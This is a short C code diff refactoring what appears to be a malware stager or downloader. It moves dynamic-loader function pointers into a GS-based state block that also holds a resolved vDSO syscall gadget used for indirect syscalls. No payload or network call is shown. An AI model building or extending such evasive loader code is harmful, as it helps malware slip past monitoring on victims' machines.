@@ -15,17 +15,12 @@
  * without reserving a general-purpose register (clang has no -ffixed-r15).
  */
 
-typedef void *(*dlopen_fn)(const char *, int);
-typedef void *(*dlsym_fn)(void *, const char *);
-typedef int (*dlclose_fn)(void *);
+#include "dynload.h"
 
 struct stager_state {
   struct stager_state *self; /* %gs:0 points back here (see get_stager_state) */
   void *syscall_gadget;      /* resolved vDSO `syscall; ret` gadget */
-  long dl_ready;             /* 1 = dl* cache not yet resolved */
-  dlopen_fn dlopen_;
-  dlsym_fn dlsym_;
-  dlclose_fn dlclose_;
+  dynload dl;                /* runtime dlopen/dlsym/dlclose cache */
 };
 
 /* Sentinel value for syscall_gadget before init_indirect_syscalls(). */
@@ -39,6 +34,10 @@ static inline struct stager_state *get_stager_state(void) {
   __asm__ __volatile__("movq %%gs:0, %0" : "=r"(st));
   return st;
 }
+
+/* dynload context backed by the state block; transports use this instead of a
+ * writable global. */
+static inline dynload *stager_dynload(void) { return &get_stager_state()->dl; }
 
 /* mmap a dedicated RW state page, initialise it, and install it as the GS
  * base. Must be called once at the top of downloader_main, before any
